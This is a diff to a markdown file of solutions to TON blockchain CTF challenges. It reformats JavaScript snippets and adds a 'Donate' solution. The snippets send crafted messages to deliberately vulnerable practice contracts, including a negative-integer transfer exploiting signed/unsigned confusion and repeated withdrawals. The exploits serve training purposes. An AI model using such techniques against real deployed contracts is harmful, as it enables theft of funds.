@@ -4,7 +4,11 @@
   <summary>Solution</summary>
 
 ```js
-await contract.send(player, beginCell().storeUint(0xf0fd50bb, 32).endCell(), toNano('0.03'));
+await contract.send(
+  player,
+  beginCell().storeUint(0xf0fd50bb, 32).endCell(),
+  toNano("0.03")
+);
 ```
 
 </details>
@@ -17,21 +21,61 @@ Solved similarly to [this](https://github.com/mysteryon88/ton-ctfs/tree/main/hac
   <summary>Solution</summary>
 
 ```js
-await contract.send(player, beginCell().storeUint(0x8caa87bd, 32).storeUint(9999, 32).endCell(), toNano('0.03'));
-
 await contract.send(
-    player,
-    beginCell()
-        .storeUint(0xf1eef33c, 32)
-        .storeAddress(Address.parse('0QCfWnJsn6EObZIpyynLFgEI__C5qX4l_WsiaokAZuDW7bT2'))
-        .endCell(),
-    toNano('0.03'),
+  player,
+  beginCell().storeUint(0x8caa87bd, 32).storeUint(9999, 32).endCell(),
+  toNano("0.03")
 );
 
-await contract.send(player, beginCell().storeUint(0xf0fd50bb, 32).endCell(), toNano('0.03'));
+await contract.send(
+  player,
+  beginCell()
+    .storeUint(0xf1eef33c, 32)
+    .storeAddress(
+      Address.parse("0QCfWnJsn6EObZIpyynLFgEI__C5qX4l_WsiaokAZuDW7bT2")
+    )
+    .endCell(),
+  toNano("0.03")
+);
+
+await contract.send(
+  player,
+  beginCell().storeUint(0xf0fd50bb, 32).endCell(),
+  toNano("0.03")
+);
 ```
 
 </details>
+
+## 14. Donate
+
+<details>
+  <summary>Solution</summary>
+
+```js
+await contract.getBalance();
+
+// donate
+await contract.send(
+  player,
+  beginCell()
+    .storeUint(0x47bbe425, 32)
+    .storeAddress(
+      Address.parse("0QCfWnJsn6EObZIpyynLFgEI__C5qX4l_WsiaokAZuDW7bT2")
+    )
+    .endCell(),
+  toNano("1.5")
+);
+
+// withdraw
+await contract.send(
+  player,
+  beginCell().storeUint(0xcb03bfaf, 32).endCell(),
+  toNano("0.1")
+);
+```
+
+  </details>
 
 ## 17. Token
 
@@ -42,16 +86,20 @@ Use of signed and unsigned numbers
 
 ```js
 await contract.getTotalSupply();
-await contract.getBalanceOf(Address.parse('EQBRJB8v2jm0srC5LNYNedch8wR35KPsqt23TSwM9R2jFgSP')); // = 1000000n
+await contract.getBalanceOf(
+  Address.parse("EQBRJB8v2jm0srC5LNYNedch8wR35KPsqt23TSwM9R2jFgSP")
+); // = 1000000n
 
 await contract.send(
-    player,
-    beginCell()
-        .storeUint(0x3ee943f1, 32)
-        .storeAddress(Address.parse('EQBRJB8v2jm0srC5LNYNedch8wR35KPsqt23TSwM9R2jFgSP'))
-        .storeInt(-1000000n, 256)
-        .endCell(),
-    toNano('0.03'),
+  player,
+  beginCell()
+    .storeUint(0x3ee943f1, 32)
+    .storeAddress(
+      Address.parse("EQBRJB8v2jm0srC5LNYNedch8wR35KPsqt23TSwM9R2jFgSP")
+    )
+    .storeInt(-1000000n, 256)
+    .endCell(),
+  toNano("0.03")
 );
 ```
 
@@ -68,11 +116,23 @@ Always check for modifying/non-modifying methods.
 
 ```js
 // deposit
-await contract.send(player, beginCell().storeUint(0, 32).endCell(), toNano('0.03'));
+await contract.send(
+  player,
+  beginCell().storeUint(0, 32).endCell(),
+  toNano("0.03")
+);
 
 // withdraw
-await contract.send(player, beginCell().storeUint(1, 32).storeCoins(toNano('0.02')).endCell(), toNano('0.03'));
-await contract.send(player, beginCell().storeUint(1, 32).storeCoins(toNano('0.02')).endCell(), toNano('0.03'));
+await contract.send(
+  player,
+  beginCell().storeUint(1, 32).storeCoins(toNano("0.02")).endCell(),
+  toNano("0.03")
+);
+await contract.send(
+  player,
+  beginCell().storeUint(1, 32).storeCoins(toNano("0.02")).endCell(),
+  toNano("0.03")
+);
 ```
 
   </details>
